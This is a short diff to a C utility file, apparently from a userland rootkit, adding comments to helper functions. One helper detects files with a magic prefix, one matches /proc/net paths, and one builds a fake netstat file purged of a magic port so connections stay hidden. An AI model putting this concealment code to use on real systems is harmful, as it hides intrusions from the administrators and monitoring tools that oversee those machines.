@@ -1,5 +1,15 @@
 #include "utils.h"
 
+/*
+ * Function:  matches_reg 
+ * --------------------
+ * matches regular expression
+ *
+ *  reg: regular expression
+ *  str: string to be matched
+ *
+ *  returns: 1 if matches otherwise 0  
+ */
 int matches_reg(const char *reg, const char *str){
     regex_t regex;
     int reti = regcomp(&regex, reg, REG_EXTENDED);
@@ -13,16 +23,45 @@ int matches_reg(const char *reg, const char *str){
     return 0;
 }
 
+/*
+ * Function:  is_magicfile
+ * --------------------
+ * check if filename has given prefix
+ *
+ *  filename: the pointer to the file name
+ *
+ *  returns: 1 if matches otherwise 0  
+ */
 int is_magicfile(const char *filename){
     char *file = basename(filename);
     return strncmp(file, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1) == 0;
 }
 
+/*
+ * Function:  is_net_file
+ * --------------------
+ * check if filename has given prefix
+ *
+ *  filename: the pointer to the file name
+ *
+ *  returns: 1 if matches otherwise 0  
+ */
 int is_net_file(const char *pathname){
     return matches_reg("^/proc(/[0-9]+)?/net/[a-z0-9]+$", pathname);
 }
 
-int fake_netstat(FILE *(*f)(const char *pathname, const char *mode), char *pathname, const char *mode, char *newfile){
+/*
+ * Function:  fake_netstat
+ * --------------------
+ * creates a fakenetstat file given the original purging it from MAGIC_PORT
+ *
+ *  f: function point to fopen or fopen64
+ *  pathname: full the path name
+ *  newfile: file pointer to new filename string that will be filled
+ *
+ *  returns: 1 if works otherwise 0  
+ */
+int fake_netstat(FILE *(*f)(const char *, const char *), char *pathname, char *newfile){
     FILE *real_fp = f(pathname, "r");
     if (!real_fp){
         return 0;
